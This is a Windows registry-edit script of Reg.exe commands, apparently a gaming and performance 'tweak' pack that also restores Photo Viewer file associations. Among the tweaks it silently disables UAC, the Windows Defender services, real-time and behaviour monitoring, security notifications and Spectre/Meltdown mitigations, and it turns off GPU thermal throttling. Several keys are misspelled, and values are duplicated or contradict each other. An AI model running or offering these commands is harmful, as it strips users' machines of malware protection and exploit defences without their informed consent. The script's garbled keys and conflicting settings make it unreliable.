Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\ClouedContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".tif" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".tiff" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".bmp" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".dib" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".gif" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jfif" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpe" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabielities\FileAssociations" /v ".jpeg" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpg" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jxr" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabileities\FileAssociations" /v ".png" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "37" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "DisableDMACopy" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "DisableBlockWrite" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "StutterMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "EnableUlps" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PP_SclkDeepSleepDisable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PP_ThermalAutoThrottlingEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "DisableDrmdmaPowerGating" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD" /v "Main3D_DEF" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD" /v "Main3D" /t REG_BINARY /d "3100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD" /v "ShaderCache" /t REG_BINARY /d "3200" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD" /v "Tessellation_OPTION" /t REG_BINARY /d "3200" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD" /v "Tessellation" /t REG_BINARY /d "3100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD" /v "VSyncControl" /t REG_BINARY /d "3000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "40" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "40" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "4294268245" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\wscsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Fax" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKCR\Applications\photoviewer.dll\shell\open" /v "MuiVerb" /t REG_SZ /d "@photoviewer.dll,-3043" /f
Reg.exe add "HKCR\Applications\photoviewer.dll\shell\open\command" /ve /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\rundll32.exe \"%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1" /f
Reg.exe add "HKCR\Applications\photoviewer.dll\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Bitmap" /v "ImageOptionFlags" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Bitmap" /v "FriendlyTypeName" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll,-3056" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Bitmap\DefaultIcon" /ve /t REG_SZ /d "%%SystemRoot%%\System32\imageres.dll,-70" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Bitmap\shell\open\command" /ve /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\rundll32.exe \"%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Bitmap\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.JFIF" /v "EditFlags" /t REG_DWORD /d "65536" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.JFIF" /v "ImageOptionFlags" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.JFIF" /v "FriendlyTypeName" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll,-3055" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.JFIF\DefaultIcon" /ve /t REG_SZ /d "%%SystemRoot%%\System32\imageres.dll,-72" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.JFIF\shell\open" /v "MuiVerb" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\photoviewer.dll,-3043" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.JFIF\shell\open\command" /ve /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\rundll32.exe \"%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.JFIF\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Jpeg" /v "EditFlags" /t REG_DWORD /d "65536" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Jpeg" /v "ImageOptionFlags" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Jpeg" /v "FriendlyTypeName" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll,-3055" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Jpeg\DefaultIcon" /ve /t REG_SZ /d "%%SystemRoot%%\System32\imageres.dll,-72" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Jpeg\shell\open" /v "MuiVerb" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\photoviewer.dll,-3043" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Jpeg\shell\open\command" /ve /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\rundll32.exe \"%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Jpeg\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Gif" /v "ImageOptionFlags" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Gif" /v "FriendlyTypeName" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll,-3057" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Gif\DefaultIcon" /ve /t REG_SZ /d "%%SystemRoot%%\System32\imageres.dll,-83" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Gif\shell\open\command" /ve /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\rundll32.exe \"%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Gif\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Png" /v "ImageOptionFlags" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Png" /v "FriendlyTypeName" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll,-3057" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Png\DefaultIcon" /ve /t REG_SZ /d "%%SystemRoot%%\System32\imageres.dll,-71" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Png\shell\open\command" /ve /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\rundll32.exe \"%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Png\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Wdp" /v "EditFlags" /t REG_DWORD /d "65536" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Wdp" /v "ImageOptionFlags" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Wdp\DefaultIcon" /ve /t REG_SZ /d "%%SystemRoot%%\System32\wmphoto.dll,-400" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Wdp\shell\open" /v "MuiVerb" /t REG_EXPAND_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\photoviewer.dll,-3043" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Wdp\shell\open\command" /ve /t REG_EXPAND_SZ /d "%%SystemRoot%%\System32\rundll32.exe \"%%ProgramFiles%%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1" /f
Reg.exe add "HKCR\PhotoViewer.FileAssoc.Wdp\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities" /v "ApplicationDescription" /t REG_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\photoviewer.dll,-3069" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities" /v "ApplicationName" /t REG_SZ /d "@%%ProgramFiles%%\Windows Photo Viewer\photoviewer.dll,-3009" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpg" /t REG_SZ /d "PhotoViewer.FileAssoc.Jpeg" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".wdp" /t REG_SZ /d "PhotoViewer.FileAssoc.Wdp" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jfif" /t REG_SZ /d "PhotoViewer.FileAssoc.JFIF" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".dib" /t REG_SZ /d "PhotoViewer.FileAssoc.Bitmap" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".png" /t REG_SZ /d "PhotoViewer.FileAssoc.Png" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jxr" /t REG_SZ /d "PhotoViewer.FileAssoc.Wdp" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".bmp" /t REG_SZ /d "PhotoViewer.FileAssoc.Bitmap" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpe" /t REG_SZ /d "PhotoViewer.FileAssoc.Jpeg" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpeg" /t REG_SZ /d "PhotoViewer.FileAssoc.Jpeg" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".gif" /t REG_SZ /d "PhotoViewer.FileAssoc.Gif" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".tif" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".tiff" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "24" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
